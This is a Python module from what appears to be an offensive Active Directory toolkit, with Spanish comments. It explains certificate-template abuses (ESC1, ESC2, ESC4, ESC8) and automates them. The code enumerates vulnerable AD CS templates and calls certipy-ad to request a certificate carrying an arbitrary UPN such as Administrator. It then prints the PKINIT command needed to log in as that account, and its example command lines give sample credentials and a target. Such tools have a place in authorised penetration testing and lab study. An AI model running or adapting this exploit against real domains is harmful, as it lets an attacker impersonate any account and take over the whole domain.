# scripts/kerberos/credentials/adcs.py
#
# Técnica: Abusos de AD CS (Active Directory Certificate Services)
#
# Fundamento:
#   AD CS es la PKI interna de Microsoft. Las plantillas de certificado
#   mal configuradas permiten obtener certificados que dan acceso a cualquier
#   cuenta del dominio.
#
#   ESC1 (Template allows SAN + Auth EKU):
#     La plantilla permite que el SOLICITANTE especifique el Subject Alternative
#     Name (SAN). Si el certificado tiene EKU de autenticación de cliente, con
#     SAN=Administrator podemos autenticarnos como ese usuario.
#
#   ESC2 (Any Purpose EKU / No EKU):
#     La plantilla tiene "Any Purpose" o no tiene EKU → puede usarse para PKINIT.
#
#   ESC4 (Template with WriteDACL by low-priv user):
#     Un usuario sin privilegios puede modificar la plantilla para añadir
#     ENROLLEE_SUPPLIES_SUBJECT → convierte en ESC1.
#
#   ESC8 (HTTP enrollment endpoint without auth):
#     El endpoint HTTP de la CA no requiere NTLM/Kerberos → NTLM relay a la CA.
#
#   Herramienta de referencia: Certify.exe (Will Schroeder) / certipy-ad (Oliver Lyak)

from scripts.base import BaseScript
from core.output import print_result, print_table, console
from core import session_db


class ADCSScript(BaseScript):
    name = "adcs"
    description = "Enumera y explota plantillas de AD CS vulnerables (ESC1/ESC2/ESC4/ESC8)"

    examples = [
        {"flag": "--ca",
         "desc": "Nombre de la CA (Certificate Authority). Si no se especifica, se enumera.",
         "good": "kerberos --script=adcs -t 10.129.1.5 -d CORP.LOCAL -u jsmith -p 'Pass123!' --ca 'CORP-CA'",
         "bad": "kerberos --script=adcs ... --ca 'ca01'  [el nombre debe ser el CN de la CA, no el hostname]"},
        {"flag": "--template",
         "desc": "Nombre de la plantilla a abusar (ESC1). Si no se especifica, enumera todas.",
         "good": "kerberos --script=adcs ... --template 'User' --alt-name Administrator",
         "bad": "kerberos --script=adcs ... --template 'DomainController'  [las plantillas de DC rara vez tienen ENROLLEE_SUPPLIES_SUBJECT habilitado]"},
        {"flag": "--alt-name",
         "desc": "UPN a incluir en el SAN del certificado (ESC1). Normalmente el usuario a impersonar.",
         "good": "kerberos --script=adcs ... --alt-name Administrator@corp.local",
         "bad": "kerberos --script=adcs ... --alt-name administrator  [sin @domain el KDC puede no reconocer la cuenta]"},
    ]

    def run(self, **kwargs):
        realm = (self.creds.domain or self.target.domain or "").upper()
        kdc = self.target.ip
        ca = kwargs.get("ca")
        template = kwargs.get("template")
        alt_name = kwargs.get("alt_name")

        if not realm: console.print("[red]Falta -d.[/red]"); return
        if not (self.creds.password or self.creds.hash):
            console.print("[red]Falta -p o -H.[/red]"); return

        print_result("KRB", kdc, "info",
                     f"adcs: enumerando CAs y plantillas en {realm}")

        # Fase 1: Enumeración
        vulns = self._enumerate_ad_cs(kdc, realm)

        if not vulns and not template:
            console.print("[dim]No se pudo enumerar AD CS via LDAP. "
                           "Intentando con certipy-ad...[/dim]")
            self._run_certipy_find(kdc, realm)
            return

        if vulns:
            rows = [(v['template'], v['esc'], v['ca'], v['notes']) for v in vulns]
            print_table("Plantillas AD CS vulnerables",
                         ["Plantilla", "ESC", "CA", "Notas"], rows)
            for v in vulns:
                session_db.save_finding(kdc, "KRB", "adcs_vuln",
                                         f"{v['esc']}: {v['template']} en {v['ca']}")

            if not template and vulns:
                v = vulns[0]
                template = v['template']
                ca = v.get('ca', ca)
                console.print(f"[dim]Usando primera plantilla vulnerable: {template} ({v['esc']})[/dim]")

        # Fase 2: Explotación ESC1 si tenemos plantilla + alt-name
        if template and alt_name and ca:
            print_result("KRB", kdc, "info",
                         f"adcs ESC1: solicitando cert para {alt_name} via plantilla {template}")
            cert_path = self._request_cert_esc1(kdc, realm, ca, template, alt_name)
            if cert_path:
                print_result("KRB", kdc, "pwned",
                             f"Certificado obtenido: {cert_path}")
                console.print("[bold yellow]Siguiente paso: PKINIT con el certificado:[/bold yellow]")
                console.print(f"  kerberos --script=pkinit -t {kdc} -d {realm} "
                               f"-u {alt_name.split('@')[0]} --pfx {cert_path}")
        elif template and not alt_name:
            console.print(f"[yellow]Especifica --alt-name para explotar ESC1 "
                           f"con la plantilla '{template}'.[/yellow]")

    def _enumerate_ad_cs(self, kdc, realm) -> list:
        """Enumera plantillas vulnerables via LDAP."""
        try:
            from modules.ldap import LDAPModule
            from core.target import Target
            ldap = LDAPModule(Target(ip=kdc, domain=realm.lower()), self.creds)
            return ldap.find_vulnerable_cert_templates()
        except (ImportError, Exception):
            return []

    def _request_cert_esc1(self, kdc, realm, ca, template, alt_name) -> str | None:
        """Solicita un certificado con SAN arbitrario via certipy-ad."""
        try:
            import subprocess, os
            out_pfx = f"/tmp/adcs_esc1_{alt_name.split('@')[0]}.pfx"
            r = subprocess.run(
                ['certipy-ad', 'req', '-u', f'{self.creds.user}@{realm.lower()}',
                 '-p', self.creds.password or '', '-dc-ip', kdc,
                 '-ca', ca, '-template', template, '-upn', alt_name,
                 '-out', out_pfx.replace('.pfx', '')],
                capture_output=True, text=True
            )
            if r.returncode == 0 or os.path.exists(out_pfx):
                return out_pfx
            console.print(f"[yellow]certipy-ad: {r.stderr[:300]}[/yellow]")
            console.print("[dim]Instala: pip install certipy-ad[/dim]")
        except Exception as e:
            console.print(f"[red]Error: {e}[/red]")
        return None

    def _run_certipy_find(self, kdc, realm):
        """Usa certipy-ad find para enumeración completa."""
        try:
            import subprocess
            r = subprocess.run(
                ['certipy-ad', 'find', '-u', f'{self.creds.user}@{realm.lower()}',
                 '-p', self.creds.password or '', '-dc-ip', kdc, '-vulnerable'],
                capture_output=True, text=True
            )
            if r.returncode == 0:
                console.print(r.stdout[:2000])
            else:
                console.print("[dim]Instala certipy-ad: pip install certipy-ad[/dim]")
        except Exception:
            console.print("[dim]certipy-ad no disponible.[/dim]")
